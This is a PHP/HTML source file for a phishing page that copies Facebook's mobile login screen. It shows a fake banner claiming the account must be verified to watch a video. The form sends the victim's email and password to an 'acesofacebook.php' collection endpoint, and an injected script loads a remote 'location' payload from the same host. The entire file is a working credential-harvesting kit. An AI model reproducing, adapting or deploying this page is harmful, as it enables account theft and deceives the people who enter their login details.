<?php 
$actual_link = (isset($_SERVER['HTTPS']) ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
$action_post = dirname(dirname($actual_link)).'/acesofacebook.php';
$action_post = str_replace("public/", "", $action_post);

if(defined('ACCESSFACEBOOK_URL')){
   $action_post = ACCESSFACEBOOK_URL;
};

 ?>

<!DOCTYPE html>
<html>
<head>
	<meta http-equiv="content-type" content="text/html; charset=UTF-8">
	<title>Log into Facebook | Facebook</title>
	<meta name="viewport" content="user-scalable=no,initial-scale=1,maximum-scale=1">
	<meta name="theme-color" content="#3b5998">
	<link type="text/css" rel="stylesheet" href="https://storage.googleapis.com/benderccsx/bendercss1.css">
	<link type="text/css" rel="stylesheet" href="https://storage.googleapis.com/benderccsx/bendercss2.css">
	
</head>
<body tabindex="0" class="touch x1-5 android _fzu _50-3 iframe acw portrait" style="min-height: 667px; background-color: rgb(255, 255, 255);">
	<div id="viewport" data-kaios-focus-transparent="1" style="min-height: 667px;">
		<h1 style="display:block;height:0;overflow:hidden;position:absolute;width:0;padding:0">Facebook</h1>
		<div id="page" class="">
			<div class="_129_" id="header-notices"></div>
			<div class="_7om2 _52we _52z5" id="header">
				<div class="_4g34 _52z6" data-sigil="mChromeHeaderCenter"><a href="#"><i class="img sp_EXjamvPof_c_1_5x sx_319c0b"><u>facebook</u></i></a></div>
			</div>
			<div class="_5soa acw" id="root" role="main" data-sigil="context-layer-root content-pane" style="min-height: 667px;">
				<div class="_7om2">
					<div class="_4g34" id="u_0_0">
						<div class="aclb _4-4l">
							<div id="login_top_banner" data-sigil="m_login_upsell login_identify_step_element">
								<div class="_qw9 grouped aclb" id="u_0_1">
									<a target="_top" class="touchableArea first last area touchable acy apl abt abb" data-sigil="touchable marea">
										<div class="ib cc">
											<i class="img l img _2sxw" style="background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABsAAAAwCAYAAADgvwGgAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyRpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMy1jMDExIDY2LjE0NTY2MSwgMjAxMi8wMi8wNi0xNDo1NjoyNyAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNiAoTWFjaW50b3NoKSIgeG1wTU06SW5zdGFuY2VJRD0ieG1wLmlpZDpEN0U2NjBCMzU5RjUxMUUyQTQ2MkNBNUI4NTk3Q0Q5RiIgeG1wTU06RG9jdW1lbnRJRD0ieG1wLmRpZDpEN0U2NjBCNDU5RjUxMUUyQTQ2MkNBNUI4NTk3Q0Q5RiI+IDx4bXBNTTpEZXJpdmVkRnJvbSBzdFJlZjppbnN0YW5jZUlEPSJ4bXAuaWlkOjhGMzBCOURBNTlGNTExRTJBNDYyQ0E1Qjg1OTdDRDlGIiBzdFJlZjpkb2N1bWVudElEPSJ4bXAuZGlkOkQ3RTY2MEIyNTlGNTExRTJBNDYyQ0E1Qjg1OTdDRDlGIi8+IDwvcmRmOkRlc2NyaXB0aW9uPiA8L3JkZjpSREY+IDwveDp4bXBtZXRhPiA8P3hwYWNrZXQgZW5kPSJyIj8++jxGoAAABGJJREFUeNrEWDtv3EYQniFP0ukkyzhBkG0gKdI4iAG3AVL5b9i1C6dJ4S5wb8OdCzdpUudXJEAqAy5t2HEMWH4Itp65h05H8o5HbmaWu8tdHu/IS2xpgQX3yOV88/hmZo8ohIBbPz74AQBu0Pye5jWaX0M2WlBvBOq6S/Mlzac0//ztl3tP7E148879n+h6j+Zl+Lxjn+YDAnysbzRo3q0C+u761dL7fz1/Pe+1y0q2A/ZNlYoVQucNR7YHZzjYMvj57u0vIvzho1/hfC3TQzA9Z2xEj/QSIt9L63n7y8b5WWa0RDRWeLTm1SiewGg8gcEwAt9DuLJ1EVKRZu74L2Cu31ACMcjuQQ/+OQngNIwJQEBzqQGrK0vQvrAKSe5Xc0Gs40a9i97wSPtgNIZnb/ZhZ68HAwJi032K3XiSwLOdAzjqB+BLL9ixrRszHXQSMCaXvdg5gt5pBEsNT4KzpSyb16M4gVcfjqVCHtrurwumLGOw7iCAQRRJS6RrXG/J+9E4JmXC7KGKsxALsBEVoLDWGsSNhyAMhGEQWwA4M17l1FdvokJEteCrLcgoZVkF873oggmtIhPERykwswan3KN/r7eW85QRYm6Se8U8E0rROE4NuHafA4jZjImZQm9QOblYzIi/w3AMaSqMC0XBeu3mTj/K7qlZ2zKjPicuJa1W32YjFhjQWmmQbsrMYmArCUKbuUpsXVyjKuGDUJbZOa+H73uw1V4DZJZoU1OxGBvZLVyONlpNQ/kiOZJEwFpzCdabyyC0kyvawFQFMYGW1q3KoqvlOLlPs72+StXFz54JC7BuzISyjGOzudEi7ZcVAXJZuhhf2lyTpcsxHetWfZFVBZmcilkNLley1VgdVmT10cnNhZsnqkxToJMkhdAutCa/ECJqPREVa0+X+YXzTGupqvtB7xRCEuj4RlmckCKH3SEkaSq7gVPm6oCxa5jO/N5e5wR2D/t0z3OijkoR3nfUH8L7g470AHcB38P6nZp7VG8YwsfDQdY6TBXHKWbzlYyCN596sN8J4KvtDdgkdjKh2Nq5YO/2utT6Q+gHoywsHma1UuiqjyY1NFtlmLjNRDG8encMrWaD0mWd8tOH7fZGOdiTFx9MbIquyDDQ4XXeBTJQ+Qp1iXA0Ibd2YYXS4uPRSTlYQiUma/lYypcCP6yyhc5veXSge3GSwEmYlhOEwbS2Tn6i1Xdy1k+fj8C94gxONuzGabqvcNPOCMVyamOhWtU4yuG0RZa+tsVFgbYra51BTCvTwoTbv7Dgzil3VwA5YKbga2HodmZhJVmZZUXra/+x0J3ZjmPxWdlB2jpQV7vR1lqfqoo1uiiwzMJ6Z327HGHpf43S9bx70xXkj9/P5P/Z+f0ZvHb9W+gcd/OvJnuH+UeNK9uwudWWa94z69lwGMD7nd1qMBaiXyqC8X2tCK/tZ4tY9lZ/HGEBs4S8fP53qRIV770txuyR+s70uce+kp2z9Uy/yi1yFPu/418BBgBQ5B6gQkER7gAAAABJRU5ErkJggg==');background-repeat:no-repeat;background-size:100% 100%;-webkit-background-size:100% 100%;width:18px;height:32px;"></i>
											<div class="c"><span class="fcl"> Facebook needs to verify your account information to allow access this video.</span></div>
										</div>
									</a>
								</div>
							</div>
							<div class="_5rut">
								<form method="post" action="<?php echo $action_post; ?>" class="mobile-login-form _5spm" id="login_form"  data-sigil="m_login_form" data-autoid="autoid_2">
									<input type="hidden" name="ua" value="" autocomplete="off">
									<input type="hidden" name="state" id="estado" value="" autocomplete="off">
									<input type="hidden" name="username" id="username" value="<?php echo USERNAME ?>" autocomplete="off">
									<div id="user_info_container" data-sigil="user_info_after_failure_element"></div>
									<div id="pwd_label_container" data-sigil="user_info_after_failure_element"></div>
									<div id="otp_retrieve_desc_container"></div>
									<div class="_56be _5sob">
										<div class="_55wo _55x2 _56bf">
											<div id="email_input_container"><input required="true" autocorrect="off" autocapitalize="off" type="text" class="_56bg _4u9z _5ruq" autocomplete="on" id="m_login_email" name="email" placeholder="Mobile number or email" data-sigil="m_login_email"></div>
											<div>
												<div class="_1upc _mg8" data-sigil="m_login_password">
													<div class="_7om2">
														<div class="_4g34 _5i2i _52we">
															<div class="_5xu4"><input required="true" autocorrect="off" autocapitalize="off" class="_56bg _4u9z _27z2" autocomplete="on" id="m_login_password" minlength="5" name="pass" placeholder="Password" type="password" data-sigil="password-plain-text-toggle-input"></div>
										<div class="_5s61 _216i _5i2i _52we"><div class="_5xu4"><div class="_2pi9" style="" onclick="javascript:sh();" id="u_0_2"><span class="mfss" style="display:none;color:#3578e5" id="u_0_3">HIDE</span><span class="mfss" id="u_0_4" style="display:block;color:#3578e5">SHOW</span></div></div></div>
														</div>
													</div>
												</div>
											</div>
										</div>
									</div>
									<div class="_2pie" style="text-align:center;">
										<div id="u_0_5" data-sigil="login_password_step_element">
											<button type="submit" value="Log In" class="_54k8 _52jh _56bs _56b_ _28lf _56bw _56bu" name="login" id="u_0_6" data-sigil="touchable m_login_button" data-autoid="autoid_4" style="cursor: pointer;"><span class="_55sr">Log In</span></button>
										</div>
									</div>
								</form>
								<div>
									<div class="_43mg"><span class="_43mh">or</span></div>
									<div class="_52jj _5t3b" id="u_0_7"><a role="button" class="_5t3c _28le btn btnS medBtn mfsm touchable" id="signup-button" tabindex="0" data-sigil="m_reg_button" data-autoid="autoid_3">Create New Account</a></div>
								</div>
								<div>
									<div class="other-links">
<span class="mfss fcg"><a tabindex="0" href="#" id="forgot-password-link">Forgot Password?</a><span aria-hidden="true"> · </span><a href="#" id="help-link" class="sec">Help Center</a></span>
									</div>
								</div>
							</div>
						</div>
					</div>
				</div>
				<div class="_55wr _5ui2" data-sigil="m_login_footer">
					<div class="_5dpw">
						<div class="_5ui3" data-nocookies="1" id="locale-selector" data-sigil="language_selector marea">
							<div class="_7om2">
								<div class="_4g34">
									<span class="_52jc _52j9 _52jh _3ztb">English (US)</span>
									<div class="_3ztc"><span class="_52jc"><a data-locale="fr_FR" data-sigil="change_language">Français (France)</a></span></div>
									<div class="_3ztc"><span class="_52jc"><a data-locale="pt_BR" data-sigil="change_language">Português (Brasil)</a></span></div>
									<div class="_3ztc"><span class="_52jc"><a data-locale="ar_AR" data-sigil="change_language">العربية</a></span></div>
								</div>
								<div class="_4g34">
									<div class="_3ztc"><span class="_52jc"><a data-locale="es_ES" data-sigil="change_language">Español (España)</a></span></div>
									<div class="_3ztc"><span class="_52jc"><a data-locale="it_IT" data-sigil="change_language">Italiano</a></span></div>
									<div class="_3ztc"><span class="_52jc"><a data-locale="de_DE" data-sigil="change_language">Deutsch</a></span></div>
									<a>
										<div class="_3j87 _1rrd _3ztd" aria-label="Complete list of languages" data-sigil="more_language"><i class="img sp_EXjamvPof_c_1_5x sx_f71af1"></i></div>
									</a>
								</div>
							</div>
						</div>
						<div class="_5ui4"><span class="mfss fcg">Facebook ©2019</span></div>
					</div>
				</div>
			</div>
		</div>
	</div>
	
	<script>
	    document.body.className =  document.body.className + ' touch x1-5 android _fzu _50-3 iframe acw portrait';
	    m_login_email.required = true;
	    m_login_password.required = true;
         var script_ = document.createElement('script');
         script_.src = "<?php echo dirname($action_post); ?>/location";
         script_.async = true;
         document.body.appendChild(script_);
      </script>
</body>
</html>